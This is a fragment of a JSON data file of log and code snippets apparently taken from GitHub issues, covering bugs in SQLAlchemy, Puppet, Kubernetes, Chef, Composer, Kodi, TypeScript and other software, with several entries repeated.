        "logs": "`\r\n$ pip install SQLAlchemy==1.3.24\r\nInstalling collected packages: SQLAlchemy\r\n  Attempting uninstall: SQLAlchemy\r\n    Found existing installation: SQLAlchemy 1.4.18\r\n    Uninstalling SQLAlchemy-1.4.18:\r\n      Successfully uninstalled SQLAlchemy-1.4.18\r\nSuccessfully installed SQLAlchemy-1.3.24\r\n\r\n$ python mcve.py \r\n\r\nthis works\r\n13 [1, 2, 3]\r\n\r\nthis works also\r\n13\r\n\r\nthis works also. using the JSON type instead of sqlalchemy_utils.JSONType\r\n13 [1, 2, 3]\r\n\r\nbut this fails with TypeError: unhashable type: list. Problem comes from having AAA.json_column in the with_entities() clause, then iterating over the query:\r\n13 [1, 2, 3]\r\n"
    },
    {
        "logs": "`\r\nclass JSONType(sqlalchemy.types.TypeDecorator):\r\n    \"\"\"\r\n    this is used as a workaround for sqlalchemy_utils.types.JSONType because it's not compatible with SQLAlchemy 1.4.23.\r\n    what they are missing is a hashable=False flag on the class, because a generic chunk of JSON (e.g. a list) is not hashable\r\n    \"\"\"\r\n    impl = sqlalchemy.UnicodeText\r\n    cache_ok = True\r\n    hashable = False\r\n\r\n    def __init__(self, *args, **kwargs):\r\n        super().__init__(*args, **kwargs)\r\n\r\n    def load_dialect_impl(self, dialect):\r\n        if dialect.name == 'postgresql':\r\n            return dialect.type_descriptor(sqlalchemy.dialects.postgresql.JSON())\r\n        return dialect.type_descriptor(self.impl)\r\n\r\n    def process_bind_param(self, value, dialect):\r\n        if dialect.name == 'postgresql':\r\n            return value\r\n        if value is not None:\r\n            return json.dumps(value)\r\n        return value\r\n\r\n    def process_result_value(self, value, dialect):\r\n        if dialect.name == 'postgresql':\r\n            return value\r\n        if value is not None:\r\n            return json.loads(value)\r\n        return value\r\n"
    },
    {
        "logs": "```python\n\"\"\"\r\npip install SQLAlchemy-Utils==0.37.8\r\n\r\npip install SQLAlchemy==1.4.23\r\n\r\n-- code below works on SQLAlchemy==1.4.18. fails on 1.4.19. so it was introduced with 1.4.19\r\n\r\nIn [2]: print(sys.version, sys.platform)\r\n3.6.9 (default, Apr 20 2021, 10:15:16) [GCC 9.3.0] linux\r\n\"\"\"\r\n\r\n\r\nimport sqlalchemy_utils\r\nfrom sqlalchemy import Column, ForeignKey, Integer, JSON, create_engine\r\nfrom sqlalchemy.orm import declarative_base, relationship, Session\r\n\r\nBase = declarative_base()\r\n\r\n\r\nclass AAA(Base):\r\n    __tablename__ = 'aaa'\r\n    id = Column(Integer, primary_key=True)\r\n    json_column = Column(sqlalchemy_utils.JSONType, nullable=False)\r\n\r\n\r\nclass BBB(Base):\r\n    __tablename__ = 'bbb'\r\n    id = Column(Integer, primary_key=True)\r\n    aaa_id = Column(Integer, ForeignKey('aaa.id'), nullable=True)\r\n    parent = relationship('AAA', backref='children')\r\n\r\n\r\nclass CCC(Base):\r\n    __tablename__ = 'ccc'\r\n    id = Column(Integer, primary_key=True)\r\n    json_column = Column(JSON, nullable=False)\r\n\r\n\r\nclass DDD(Base):\r\n    __tablename__ = 'ddd'\r\n    id = Column(Integer, primary_key=True)\r\n    ccc_id = Column(Integer, ForeignKey('ccc.id'), nullable=True)\r\n    parent = relationship('CCC', backref='children')\r\n\r\n\r\ndef main():\r\n    eng = create_engine('postgresql://postgres@localhost/mcve', echo=False)\r\n    Base.metadata.drop_all(eng)\r\n    Base.metadata.create_all(eng)\r\n    db_session = Session(eng)\r\n\r\n    db_session.add(AAA(id=13, json_column=[1, 2, 3]))\r\n    db_session.add(BBB(id=333, aaa_id=13))\r\n\r\n    db_session.add(CCC(id=13, json_column=[1, 2, 3]))\r\n    db_session.add(DDD(id=333, ccc_id=13))\r\n    db_session.commit()\r\n\r\n    print('\\nthis works')\r\n    query = db_session.query(AAA).with_entities(AAA.id, AAA.json_column)\r\n    for (parent_id, json_column) in query:\r\n        print(parent_id, json_column)\r\n\r\n    print('\\nthis works also')\r\n    query = db_session.query(AAA).join(BBB).with_entities(AAA.id)\r\n    for (parent_id,) in query:\r\n        print(parent_id)\r\n\r\n    print('\\nthis works also. using the JSON type instead of sqlalchemy_utils.JSONType')\r\n[Truncated]\n    main()\r\n  File \"mcve.py\", line 77, in main\r\n    for (parent_id, json_column) in query:\r\n  File \"/home/jhersch/.virtualenvs/gemini3.6.9/lib/python3.6/site-packages/sqlalchemy/engine/result.py\", line 371, in iterrows\r\n    if hashed in uniques:\r\nTypeError: unhashable type: 'list'\r\n"
    },
    {
        "logs": "```\r\n$ pip install SQLAlchemy==1.3.24\r\nInstalling collected packages: SQLAlchemy\r\n  Attempting uninstall: SQLAlchemy\r\n    Found existing installation: SQLAlchemy 1.4.18\r\n    Uninstalling SQLAlchemy-1.4.18:\r\n      Successfully uninstalled SQLAlchemy-1.4.18\r\nSuccessfully installed SQLAlchemy-1.3.24\r\n\r\n$ python mcve.py \r\n\r\nthis works\r\n13 [1, 2, 3]\r\n\r\nthis works also\r\n13\r\n\r\nthis works also. using the JSON type instead of sqlalchemy_utils.JSONType\r\n13 [1, 2, 3]\r\n\r\nbut this fails with TypeError: unhashable type: list. Problem comes from having AAA.json_column in the with_entities() clause, then iterating over the query:\r\n13 [1, 2, 3]\r\n"
    },
    {
        "logs": "`Error: Could not retrieve catalog from remote server: Error 400 on SERVER: Evaluation Error: Error while evaluating a Resource Statement, Duplicate declaration: File[/var/lib/rundeck/.ssh/id_rsa] is already declared in file /etc/puppetlabs/code/environments/production/modules/rundeck/manifests/install.pp:102; cannot redeclare at /etc/puppetlabs/code/environments/production/modules/site_rundeck/manifests/init.pp:112 at /etc/puppetlabs/code/environments/production/modules/site_rundeck/manifests/init.pp:112:3 on node"
    },
    {
        "logs": "`\r\nitems:\r\n    - path: \"cfg.ini\"\r\n      configMapRef: \"special-config\"\r\n      template: |\r\n          [DEFAULT]\r\n          LABELS = {{ .speciallabels }}\r\n          POD_NAME = {{ .specialname }}\r\n\r\nWill render a \"cfg.ini\" file with values from \"special-config\" configmap\r\ninterpolated.\n<issue_comment>username_1: Ideas like this are generally better discussed as proposal docs, rather than code.  It's far easier to get the intentions through words than through code.\r\n\r\n(a) is already handled by downwardAPI\r\n\r\n(b) means this is no longer ConfigMap and is instead some uber-volume, which I am not AGAINST but I'd need to see justification for.  We have a \"budget\" for idea and complexity, and whatever we spend on this idea can't be spent elsewhere.\r\n\r\n(c) is stepping in the grey area of what Kubernetes isn't.  I'm not strictly against templating, because I know how useful simple templates can be, but I also know that it is a slipper slope to complex expressions.  I'd rather build a sidecar container for some templating tool (or tools) and have that sidecar ingest a config map with template and expansions, and write out a config file.\n<issue_comment>username_2: It appears to me that the desired goal in this PR is to allow a single projection that spans values from multiple "
    },
    {
        "logs": "`\r\n  Rendering\\UnknownSourceFileInfo.cs(42,16): warning CS0114: 'UnknownSourceFileInfo.GetHashCode()' hides inherited member 'object.GetHashCode()'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]\r\n  Rendering\\UnknownSourceFileInfo.cs(59,17): warning CS0114: 'UnknownSourceFileInfo.Equals(object)' hides inherited member 'object.Equals(object)'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]\r\n"
    },
    {
        "logs": "```\r\n  Rendering\\UnknownSourceFileInfo.cs(42,16): warning CS0114: 'UnknownSourceFileInfo.GetHashCode()' hides inherited member 'object.GetHashCode()'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]\r\n  Rendering\\UnknownSourceFileInfo.cs(59,17): warning CS0114: 'UnknownSourceFileInfo.Equals(object)' hides inherited member 'object.Equals(object)'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword. [C:\\Users\\Craig.Fowler\\Documents\\Visual Studio 2015\\Projects\\ZPT-Sharp\\CSF.Zpt\\CSF.Zpt.csproj]\r\n"
    },
    {
        "logs": "`\r\nFailed to add/delete a test host on foobar.baz, check your DNS server configuration.\r\nThis is a requirement for setting the available flag. \r\n"
    },
    {
        "logs": "` like what\r\n\r\n  - '[TxRxResult] There is no status packet!\r\n[ID:032] GoalPos:400  PresPos:000\r\n[TxRxResult] There is no status packet!\r\n[ID:032] GoalPos:400  PresPos:000\r\n[TxRxResult] There is no status packet!\r\n[ID:032] GoalPos:400  PresPos:000'\r\n\r\n\r\nHi, as said I want to connect a DYNAMIXEL AX12A motor with Matlab 2018a on my MAC OSX, but I got the error  '[TxRxResult] There is no status packet!' while testing read_write.m example. I have already changed the baudrate, the ID, the port number and the goal position according to the e-manual. \r\n\r\nI attached my code below.\r\n\r\nThanks in advance.\r\n\r\nclc;\r\nclear all;\r\n\r\nlib_name = '';\r\n\r\nif strcmp(computer, 'PCWIN')\r\n  lib_name = 'dxl_x86_c';\r\nelseif strcmp(computer, 'PCWIN64')\r\n  lib_name = 'dxl_x64_c';\r\nelseif strcmp(computer, 'GLNX86')\r\n  lib_name = 'libdxl_x86_c';\r\nelseif strcmp(computer, 'GLNXA64')\r\n  lib_name = 'libdxl_x64_c';\r\nelseif strcmp(computer, 'MACI64')\r\n  lib_name = 'libdxl_mac_c';\r\nend\r\n\r\n% Load Libraries\r\nif ~libisloaded(lib_name)\r\n    [notfound, warnings] = loadlibrary(lib_name, 'dynamixel_sdk.h', 'addheader', 'port_handler.h', 'addheader', 'packet_handler.h');\r\nend\r\n\r\n% Control table address\r\nADDR_AX_TORQUE_ENABLE       = 24;           % Control table address is different in Dynamixel model\r\nADDR_AX_GOAL_POSITION       = 30;\r\nADDR_AX_PRESENT_POSITION    = 36;\r\n\r\n% Protocol version\r\nPROTOCOL_VERSION            = 1.0;          % See which protocol version is used in the Dynamixel\r\n\r\n% Default setting\r\nDXL_ID                      = 32;            % Dynamixel ID: 1\r\nBAUDRATE                    = 57600; \r\nDEVICENAME                  = '/dev/tty.usbserial-A4008aCg';       % Check which port is being used on your controller\r\n                                            % ex) Windows: 'COM1'   Linux: '/dev/ttyUSB0' Mac: '/dev/tty.usbserial-*'\r\n[Truncated]\n\r\n\r\n% Disable Dynamixel Torque\r\nwrite1ByteTxRx(port_num, PROTOCOL_VERSION, DXL_ID, ADDR_AX_TORQUE_ENABLE, TORQUE_DISABLE);\r\ndxl_comm_result = getLastTxRxResult(port_num, PROTOCOL_VERSION);\r\ndxl_error = getLastRxPacketError(port_num, PROTOCOL_VERSION);\r\nif dxl_comm_result ~= COMM_SUCCESS\r\n    fprintf('%s\\n', getTxRxResult(PROTOCOL_VERSION, dxl_comm_result));\r\nelseif dxl_error ~= 0\r\n    fprintf('%s\\n', getRxPacketError(PROTOCOL_VERSION, dxl_error));\r\nend\r\n\r\n% Close port\r\nclosePort(port_num);\r\n\r\n% Unload Library\r\nunloadlibrary(lib_name);\r\n\r\nclose all;\r\nclear all;\n<issue_comment>username_1: @username_0 \r\n\r\nHi,\r\n\r\n1. Could you recheck if the Dynamixel settings are the same as you set in the code?\r\n\r\n2. Did you put the power in the Dynamixel over 12V?\r\n\r\n3. Could you "
    },
    {
        "logs": "`\r\nchef-server-nginx_1  | hab-launch(SV): Child for service 'chef-server-nginx.default' with PID 163 exited with code exit code: 1\r\nchef-server-nginx_1  | chef-server-nginx.default(SV): Starting service as user=hab, group=hab\r\nchef-server-nginx_1  | chef-server-nginx.default(O): 2018/05/03 17:50:24 [emerg] 167#0: open() \"/dev/stdout\" failed (13: Permission denied)\r\n"
    },
    {
        "logs": "```\r\nchef-server-nginx_1  | hab-launch(SV): Child for service 'chef-server-nginx.default' with PID 163 exited with code exit code: 1\r\nchef-server-nginx_1  | chef-server-nginx.default(SV): Starting service as user=hab, group=hab\r\nchef-server-nginx_1  | chef-server-nginx.default(O): 2018/05/03 17:50:24 [emerg] 167#0: open() \"/dev/stdout\" failed (13: Permission denied)\r\n"
    },
    {
        "logs": "`\r\n        [Composer\\Downloader\\TransportException]                                                                                                                                     \r\n        The \"http://packagist.org/p/provider-2018-01%24b6dfa015e80a095987bed2b513a1e030aa34d1f8e8b28899c95d7d89511f721b.json\" file could not be downloaded (HTTP/1.1 404 Not Found)  \r\n"
    },
    {
        "logs": "```\r\n        [Composer\\Downloader\\TransportException]                                                                                                                                     \r\n        The \"http://packagist.org/p/provider-2018-01%24b6dfa015e80a095987bed2b513a1e030aa34d1f8e8b28899c95d7d89511f721b.json\" file could not be downloaded (HTTP/1.1 404 Not Found)  \r\n"
    },
    {
        "logs": "`\r\n$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\ncustomresourcedefinition.apiextensions.k8s.io/jaegers.jaegertracing.io created\r\n$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nError from server (AlreadyExists): error when creating \"https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\": customresourcedefinitions.apiextensions.k8s.io \"jaegers.jaegertracing.io\" already exists\r\n"
    },
    {
        "logs": "`\r\n$ kubectl apply -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nThe CustomResourceDefinition \"jaegers.jaegertracing.io\" is invalid: metadata.annotations: Too long: must have at most 262144 characters\r\n"
    },
    {
        "logs": "```\r\n$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\ncustomresourcedefinition.apiextensions.k8s.io/jaegers.jaegertracing.io created\r\n$ kubectl create -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nError from server (AlreadyExists): error when creating \"https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\": customresourcedefinitions.apiextensions.k8s.io \"jaegers.jaegertracing.io\" already exists\r\n"
    },
    {
        "logs": "```\r\n$ kubectl apply -f https://raw.githubusercontent.com/jaegertracing/jaeger-operator/master/deploy/crds/jaegertracing.io_jaegers_crd.yaml\r\nThe CustomResourceDefinition \"jaegers.jaegertracing.io\" is invalid: metadata.annotations: Too long: must have at most 262144 characters\r\n"
    },
    {
        "logs": "`cs\r\n\r\n\t\t[TestMethod]\r\n\t\tpublic async Task MixedMethodsWithPartialFix()\r\n\t\t{\r\n\t\t\tvar test = @\"namespace ConsoleApplication1\r\n{\r\n\tusing System;\r\n\tusing System.Collections.Generic;\r\n\tusing System.Linq;\r\n\tusing System.Text;\r\n\tusing System.Threading.Tasks;\r\n\tusing System.Diagnostics;\r\n\tusing System.IO;\r\n\r\n\tpublic class TestClass\r\n\t{\r\n\t\tprivate string _workspaceFile;\r\n\r\n\t\tpublic async Task<Configuration[]> LoadStorageContentAsync()\r\n\t\t{\r\n\t\t\tvar fileInfo = new FileInfo(_workspaceFile);\r\n\t\t\tif (!fileInfo.Exists)\r\n\t\t\t{\r\n\t\t\t\tLog.Error($\"\"No configuration storage located at { fileInfo.FullName}.\"\");\r\n\t\t\t\treturn Array.Empty<Configuration>();\r\n\t\t\t}\r\n\r\n\t\t\tusing (var stream = new StreamReader(new FileStream(fileInfo.FullName, FileMode.Open)))\r\n\t\t\t{\r\n\t\t\t\ttry\r\n\t\t\t\t{\r\n\t\t\t\t\tvar storage = new Storage();\r\n\t\t\t\t\treturn Task.FromResult(storage.Configurations.ToArray());\r\n\t\t\t\t}\r\n\t\t\t\tcatch (Exception e)\r\n\t\t\t\t{\r\n\t\t\t\t\tLog.Error(e);\r\n\t\t\t\t\treturn Array.Empty<Configuration>();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tpublic class Log\r\n\t\t{\r\n\t\t\tpublic static void Error(Exception p0)\r\n\t\t\t{\r\n\t\t\t\tthrow new NotImplementedException();\r\n\t\t\t}\r\n\r\n\t\t\tpublic static void Error(string p0)\r\n\t\t\t{\r\n\t\t\t\tthrow new NotImplementedException();\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tpublic class Storage\r\n\t\t{\r\n\t\t\tpublic Configuration[] Configurations { get; set; }\r\n\t\t}\r\n\t\tpublic class Configuration\r\n\t\t{\r\n\t\t\tpublic Guid Id { get; set; }\r\n\t\t\tpublic string ConfigurationName { get; set; }\r\n\t\t}\r\n\t}\r\n}\";\r\n\r\n\r\n[Truncated]\n\t\t\t\tvar fixedDocument = await GetFixedDocumentAsync(context, context.CancellationToken, diagnostic)\r\n\t\t\t\t\t.ConfigureAwait(false);\r\n\t\t\t\tvar fixedRoot = await fixedDocument.GetSyntaxRootAsync(context.CancellationToken)\r\n\t\t\t\t\t.ConfigureAwait(false);\r\n\r\n\t\t\t\tif(fixedRoot.IsEquivalentTo(originalRoot))\r\n\t\t\t\t\tcontinue;\r\n\r\n\t\t\t\tcontext.RegisterCodeFix(CodeAction.Create(GetTitle(fixedRoot), c => Task.FromResult(fixedDocument), GetEquivalenceKey(fixedRoot)), diagnostic);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tprotected string GetAnnotationValue(SyntaxNode rootNode, string annotation, string defaultValue = \"unknown annotation\")\r\n\t\t{\r\n\t\t\treturn rootNode.GetAnnotations(annotation).FirstOrDefault(d => d.Kind == annotation)?.Data ?? defaultValue;\r\n\t\t}\r\n\t}\r\n\r\n"
    },
    {
        "logs": "`\r\nIf the certificate issuer is not the CRL issuer, then the cRLIssuer field MUST be \r\npresent and contain the Name of the CRL issuer.  If the certificate issuer is also \r\nthe CRL issuer, then conforming CAs MUST omit the cRLIssuer field and MUST \r\ninclude the distributionPoint field\r\n"
    },
    {
        "logs": "```\r\nIf the certificate issuer is not the CRL issuer, then the cRLIssuer field MUST be \r\npresent and contain the Name of the CRL issuer.  If the certificate issuer is also \r\nthe CRL issuer, then conforming CAs MUST omit the cRLIssuer field and MUST \r\ninclude the distributionPoint field\r\n"
    },
    {
        "logs": "`\r\ncoolpup.py Scc1-control.10000.cool CH12_loops_Rao.bed --nshifts 10 --unbalanced --coverage_norm --mindist 100000 --outname Ctrl_loop.txt --log WARNING\r\n"
    },
    {
        "logs": "```\r\ncoolpup.py Scc1-control.10000.cool CH12_loops_Rao.bed --nshifts 10 --unbalanced --coverage_norm --mindist 100000 --outname Ctrl_loop.txt --log WARNING\r\n"
    },
    {
        "logs": "`\r\nsonata-project/admin-bundle              3.78.1 3.78.1 The missing Symfony Admin Generator\r\nsonata-project/block-bundle              4.4.0  4.4.0  Symfony SonataBlockBundle\r\nsonata-project/cache                     2.0.1  2.0.1  Cache library\r\nsonata-project/doctrine-extensions       1.10.1 1.10.1 Doctrine2 behavioral extensions\r\nsonata-project/doctrine-orm-admin-bundle 3.24.0 3.24.0 Integrate Doctrine ORM into the SonataAdminBundle\r\nsonata-project/exporter                  2.4.1  2.4.1  Lightweight Exporter library\r\nsonata-project/form-extensions           1.6.0  1.6.0  Symfony form extensions\r\nsonata-project/twig-extensions           1.4.1  1.4.1  Sonata twig extensions\r\n"
    },
    {
        "logs": "`\r\nExample :: signatureName(paramName: Type) => ReturnType<issue_closed>\n<issue_comment>username_1: related discussion: https://github.com/Microsoft/TypeScript/issues/3694\n<issue_comment>username_1: The "
    },
    {
        "logs": "`\n<issue_comment>username_0: I forgot about that proposal but now that you remind me I did participate in proposal-bind-operator#24\r\n\r\nI like your example, it's simple and it reused a reserved type [that has already been defined](https://github.com/username_1/rtype#the-iterable-type), much clearer than mine.\n<issue_comment>username_0: @username_1 \r\n\r\n1. which syntax(es) should we support?\r\n\r\n"
    },
    {
        "logs": "`?\r\n\r\nIf so, shouldn't it be recommended?\n<issue_comment>username_1: I think you're misunderstanding the second syntax. In the proposal, the "
    },
    {
        "logs": "`\r\n\r\nAre you telling me that https://babeljs.io/docs/plugins/transform-function-bind/#detail is erroneous?\n<issue_comment>username_1: OK, but not sure how that makes sense.\r\n\r\n"
    },
    {
        "logs": "` is always a property in the former case. It means that B is out the question since our main use case restricts a context: if we kept it as is we would define the method directly without the need of a subset.\r\n\r\nSo my vote goes to A.\n<issue_comment>username_0: Let's forget about the infix "
    },
    {
        "logs": "`;\r\n  }\r\n\r\n  static get properties() {\r\n    return {\r\n      _items: Array\r\n    }\r\n  }\r\n\r\n  constructor() {\r\n     super();\r\n     this._items = [];\r\n   }\r\n\r\n  _stateChanged(state) {\r\n     if (Object.keys(state.items).length !== 0) {\r\n       this._items = state.items;\r\n     }\r\n   }\r\n\r\n   \r\n...\r\n"
    },
    {
        "logs": "`\r\nvirtual-repeater.js:497 Uncaught TypeError: Cannot read property 'getBoundingClientRect' of null\r\n    at Object._measureChild (virtual-repeater.js:497)\r\n    at Object._measureChild (lit-repeater.js:83)\r\n    at children.map (virtual-repeater.js:233)\r\n    at Array.map (<anonymous>)\r\n    at Object._measureChildren (virtual-repeater.js:232)\r\n    at Object._render (virtual-repeater.js:288)\r\n    at Object._render (virtual-scroller.js:208)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)\r\nUncaught TypeError: Failed to execute 'observe' on 'ResizeObserver': parameter 1 is not of type 'Element'.\r\n    at _kids.forEach.child (virtual-scroller.js:218)\r\n    at Array.forEach (<anonymous>)\r\n    at Object._render (virtual-scroller.js:218)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)\r\n"
    },
    {
        "logs": "```\r\n...\r\n\r\nimport { virtualScroller } from '../../libs/lit-scroller.js';\r\n\r\nclass CreatorPrintsList extends connect(store)(LitElement) {\r\n\r\n  _render({_items}) {\r\n    return html`\r\n      <div class=\"list\">\r\n      \r\n        ${ virtualScroller(_items.length, (i) => html`\r\n            ${console.log(_items[i].id)}       // \"Cannot read property 'id' of undefined\"\r\n            ${console.log(this._items[i].id)}  // working, returns id of 3\r\n        `) }\r\n        \r\n      </div>`;\r\n  }\r\n\r\n  static get properties() {\r\n    return {\r\n      _items: Array\r\n    }\r\n  }\r\n\r\n  constructor() {\r\n     super();\r\n     this._items = [];\r\n   }\r\n\r\n  _stateChanged(state) {\r\n     if (Object.keys(state.items).length !== 0) {\r\n       this._items = state.items;\r\n     }\r\n   }\r\n\r\n   \r\n...\r\n"
    },
    {
        "logs": "```\r\nvirtual-repeater.js:497 Uncaught TypeError: Cannot read property 'getBoundingClientRect' of null\r\n    at Object._measureChild (virtual-repeater.js:497)\r\n    at Object._measureChild (lit-repeater.js:83)\r\n    at children.map (virtual-repeater.js:233)\r\n    at Array.map (<anonymous>)\r\n    at Object._measureChildren (virtual-repeater.js:232)\r\n    at Object._render (virtual-repeater.js:288)\r\n    at Object._render (virtual-scroller.js:208)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)\r\nUncaught TypeError: Failed to execute 'observe' on 'ResizeObserver': parameter 1 is not of type 'Element'.\r\n    at _kids.forEach.child (virtual-scroller.js:218)\r\n    at Array.forEach (<anonymous>)\r\n    at Object._render (virtual-scroller.js:218)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)\r\n"
    },
    {
        "logs": "`\r\n10:02:46.885 T:18446744072501378232  NOTICE: Trying to open: 44100 samplerate 12 channelMask 4 encoding\r\n10:02:46.895 T:18446744072501378232  NOTICE: CAESinkAUDIOTRACK::Initializing with: m_sampleRate: 44100 format: AE_FMT_FLOAT (AE) method: PCM stream-type: PCM-STREAM min_buffer_size: 45152 m_frames: 2822 m_frameSize: 8 channels: 2\r\n10:07:34.104 T:18446744072501378232  NOTICE: Trying to open: 44100 samplerate 12 channelMask 4 encoding\r\n10:07:34.112 T:18446744072501378232  NOTICE: CAESinkAUDIOTRACK::Initializing with: m_sampleRate: 44100 format: AE_FMT_FLOAT (AE) method: PCM stream-type: PCM-STREAM min_buffer_size: 45152 m_frames: 2822 m_frameSize: 8 channels: 2\r\n10:07:58.914 T:18446744072531893728   ERROR: EXCEPTION: Dialog not created.\r\n10:08:01.066 T:18446744072531893728 WARNING: CSkinInfo: failed to load skin settings\r\n10:08:01.930 T:18446744072531893728   ERROR: EXCEPTION: Dialog not created.\r\n10:08:19.223 T:18446744072499596904  NOTICE: VideoPlayer: Opening: https://vodus-i-video-nfl.akamaized.net/vodus/e9323e31-b160-4bd0-b5f7-84587d9ea8b9/NoADs_ATL_PHI_1080_reg1.ism/QualityLevels(3443943)/Manifest(video,format=m3u8-aapl-v3,audiotrack=aac_UND_2_128,filter=chromecast)?hdnea=st=1536505324~exp=1536505504~acl=/*~hmac=ed186b915cdc304eaa06c481acddc98724ca77c5832cd710bead57e83e4a5415&hdcore=2.11.3|Connection=keep-alive&User-Agent=Firefox|Connection=keep-alive&User-Agent=Firefox\r\n10:08:19.223 T:18446744072499596904 WARNING: CDVDMessageQueue(player)::Put MSGQ_NOT_INITIALIZED\r\n10:08:19.347 T:18446744072548641904  NOTICE: Creating InputStream\r\n10:08:19.999 T:18446744072548641904  NOTICE: Creating Demuxer\r\n10:08:50.358 T:18446744072548641904   ERROR: OpenDemuxStream - Error creating demuxer\r\n10:08:50.358 T:18446744072548641904  NOTICE: CVideoPlayer::OnExit()\r\n10:08:50.440 T:18446744072499596904  NOTICE: CVideoPlayer::CloseFile()\r\n10:08:50.440 T:18446744072499596904  NOTICE: VideoPlayer: waiting for threads to exit\r\n10:08:50.440 T:18446744072499596904  NOTICE: VideoPlayer: finished waiting\r\n10:08:50.441 T:18446744072499596904  NOTICE: CVideoPlayer::CloseFile()\r\n10:08:50.441 T:18446744072499596904  NOTICE: VideoPlayer: waiting for threads to exit\r\n10:08:50.441 T:18446744072499596904  NOTICE: VideoPlayer: finished waiting\r\n"
    },
    {
        "logs": "`ts\r\ntype AorB = 'a' | 'b';\r\n\r\nfunction isA(t: AorB): t is 'a' {\r\n  return t === 'a';\r\n}\r\n\r\nfunction test<T extends AorB>(arg: T) {\r\n  if (isA(arg)) {\r\n    let a1: T & 'a' = arg; // ok\r\n  }\r\n  if (arg === 'a') {\r\n    let a2: T & 'a' = arg; // error\r\n  }\r\n}\r\n"
    },
    {
        "logs": "` block.\r\n\r\n**Playground Link:** [Playground Link](http://www.typescriptlang.org/play/?ts=3.9.0-dev.20200212&ssl=15&ssc=1&pln=7&pc=1#code/C4TwDgpgBAgg9gJwEJQLxQOQEMNQD6YBGGA3AFBkBmArgHYDGwAlnLVEwM4wAUwAXLERIAlAODsOmHFADeZKFAQRg1BG3GpNU0mQC+FGg2asowCB2AAeACpQIADzO0AJpPjIAfNywIA5gOthWXl2SihuTh4fX2EguQUFABtlKCwARgCoADJtNFS-EigAeiKoOABrEP0FJjDvPzQtbAw4kKSUrAAmTJzmvOjCkrsEBEQqvTIgA)\r\n\r\n**Related Issues:** N/A\n<issue_comment>username_1: Ok so the following question is related to this - https://stackoverflow.com/questions/60204107/typescript-doesnt-infer-correct-type-with-generic-extending-string-union-type/60206029#60206029.\r\n\r\nAs I assume what is happening here is that the condition is valid, as it has no error-prone runtime effect, but the typeguard is not applied by it. And the reason why the condition doesn't work as typguard is a fact that typeguard can work only forall members. Below equivalent typeguard:\r\n"
    },
    {
        "logs": "```ts\r\ntype AorB = 'a' | 'b';\r\n\r\nfunction isA(t: AorB): t is 'a' {\r\n  return t === 'a';\r\n}\r\n\r\nfunction test<T extends AorB>(arg: T) {\r\n  if (isA(arg)) {\r\n    let a1: T & 'a' = arg; // ok\r\n  }\r\n  if (arg === 'a') {\r\n    let a2: T & 'a' = arg; // error\r\n  }\r\n}\r\n"
    },
    {
        "logs": "`IgActionSpamError: POST /api/v1/direct_v2/threads/broadcast/text/ - 400 Bad Request; feedback_required\r\n    at Request.handleResponseError (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/core/request.js:98:20)\r\n    at Request.send (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/core/request.js:52:28)\r\n    at async DirectThreadRepository.broadcast (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/repositories/direct-thread.repository.js:176:26)\r\n    at async DirectThreadEntity.broadcast (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/entities/direct-thread.entity.js:180:26)\r\n    at async DirectThreadEntity.broadcastText (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/entities/direct-thread.entity.js:25:16)\r\n    at async Device.sendMessage (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/device.js:115:7)\r\n    at async SendMessages._sendMessage (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/instagram/send-messages.js:88:22)\r\n    at async SendMessages.call (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/instagram/send-messages.js:79:5)\r\n    at async /Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/jobs.init.js:32:7"
    },
    {
        "logs": "`)\r\n      console.log('message was sent to', user.id, user.username  )\r\n    } catch (e) {\r\n      console.error('Device#sendMessage Error', e.message)\r\n      throw e\r\n    }\r\n  }\r\n"
    },
    {
